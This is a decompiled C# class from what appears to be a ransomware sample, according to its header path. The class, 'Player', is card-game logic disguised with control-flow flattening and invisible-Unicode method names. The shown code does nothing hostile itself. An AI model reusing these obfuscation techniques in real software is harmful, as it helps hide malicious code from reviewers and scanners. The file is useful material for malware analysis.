// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: StreamWriterBufferedDataLo, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 2A001E45-B149-45C2-9BBE-A5BA299DBD32
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-375dd437fa652b84e37aabfc7547012047b9c468f5470c4761424ed1086c52a4.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1195371545;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2072132347)) % 12U)
        {
          case 0:
            str1 = "544772";
            num1 = (int) num2 * 258404282 ^ 752029818;
            continue;
          case 1:
            int num3 = flag ? 250137708 : (num3 = 452120138);
            num1 = num3 ^ (int) num2 * -1365351272;
            continue;
          case 2:
            str1 = (string) null;
            int num4 = BaseStream == 0 ? -1095558813 : (num4 = -348420331);
            num1 = num4 ^ (int) num2 * 573782080;
            continue;
          case 4:
            num1 = (int) num2 * -1664007665 ^ -261361808;
            continue;
          case 5:
            num1 = (int) num2 * -1431336428 ^ -1793940058;
            continue;
          case 6:
            flag = BaseStream == 1;
            num1 = 1189487438;
            continue;
          case 7:
            num1 = (int) num2 * -1684366354 ^ -1596820163;
            continue;
          case 8:
            num1 = (int) num2 * -607997754 ^ 338336588;
            continue;
          case 9:
            str2 = str1;
            num1 = 658980891;
            continue;
          case 10:
            goto label_1;
          case 11:
            str1 = "466978656453697A654C69";
            num1 = (int) num2 * 952450754 ^ -790891812;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 159270018;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 2034922250)) % 3U)
      {
        case 0:
          goto label_1;
        case 1:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 994215180;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
        int index = 0;
label_1:
        int num2 = 179617258;
        int num3;
        bool flag;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 825760965)) % 11U)
          {
            case 0:
              planningCardsCount = num1;
              num2 = (int) num4 * -1192913532 ^ 1712567164;
              continue;
            case 1:
              num2 = 839663931;
              continue;
            case 2:
              int num5 = flag ? 852950014 : (num5 = 1230595060);
              num2 = num5 ^ (int) num4 * -229781301;
              continue;
            case 3:
              int num6;
              num2 = num6 = index >= planningCards.Length ? 1086944654 : (num6 = 31169982);
              continue;
            case 4:
              ++index;
              num2 = (int) num4 * 1149665358 ^ -140789493;
              continue;
            case 6:
              num2 = (int) num4 * -1898653716 ^ -1449981381;
              continue;
            case 7:
              flag = num3 > 0;
              num2 = (int) num4 * 2022687780 ^ 232172079;
              continue;
            case 8:
              ++num1;
              num2 = (int) num4 * 315973596 ^ 1543163858;
              continue;
            case 9:
              goto label_1;
            case 10:
              num3 = planningCards[index];
              num2 = 482315340;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -1138272352;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -250187066)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 1997045968 ^ -918828422;
            continue;
          case 2:
            num1 = (int) num2 * 561837355 ^ -745247091;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -797563373;
      string str1;
      int index;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -52472325)) % 13U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1087117580 ^ 244702118;
            continue;
          case 2:
            int num3 = planningCard == 0 ? 674335596 : (num3 = 877882883);
            num1 = num3 ^ (int) num2 * -1797041865;
            continue;
          case 3:
            int num4;
            num1 = num4 = index < this.PlanningCards.Length ? -555790619 : (num4 = -1429027647);
            continue;
          case 4:
            ++index;
            num1 = -87025000;
            continue;
          case 5:
            str1 = Player.\u200B⁪‬‎‮⁯⁫‭‏‏‬‌‏⁫​‍‫⁯‏⁬‍‬⁮⁮‏‫‪​‭⁯‬⁪‎⁬​⁬⁮‎⁭‫‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -825419681;
            continue;
          case 6:
            str2 = str1;
            num1 = (int) num2 * 802042801 ^ 1629563266;
            continue;
          case 7:
            num1 = (int) num2 * 1634306927 ^ 65072059;
            continue;
          case 8:
            planningCard = this.PlanningCards[index];
            num1 = -805896112;
            continue;
          case 10:
            num1 = (int) num2 * -2093212100 ^ 1098015680;
            continue;
          case 11:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 1067728310 ^ -1011003258;
            continue;
          case 12:
            num1 = (int) num2 * 49610796 ^ -1494106584;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 929711749;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1829043474)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1459608198 ^ 230764042;
            continue;
          case 3:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1450258180 ^ 662628499;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
label_1:
      int num1 = -1311969268;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1791984938)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 684018976 ^ -1213364734;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -1688147575;
            continue;
          case 3:
            ++aIndex;
            num1 = (int) num2 * -2062935302 ^ -1897464956;
            continue;
          case 5:
            planningCards = numArray;
            num1 = (int) num2 * 1629141246 ^ -1060409587;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex >= count ? -1098176642 : (num3 = -999125511);
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1244457716;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -588195499)) % 3U)
        {
          case 1:
            str = Player.\u202D⁭⁬⁮‌⁯⁬⁭‬⁮‏‭‏⁫‭⁪⁮‪‏⁮‬⁬⁭⁮‌​‪‫‬​⁪‪⁪⁫⁬‪‎⁫​⁭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 769692254 ^ -691011988;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u200B⁪‬‎‮⁯⁫‭‏‏‬‌‏⁫​‍‫⁯‏⁬‍‬⁮⁮‏‫‪​‭⁯‬⁪‎⁬​⁬⁮‎⁭‫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202D⁭⁬⁮‌⁯⁬⁭‬⁮‏‭‏⁫‭⁪⁮‪‏⁮‬⁬⁭⁮‌​‪‫‬​⁪‪⁪⁫⁬‪‎⁫​⁭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
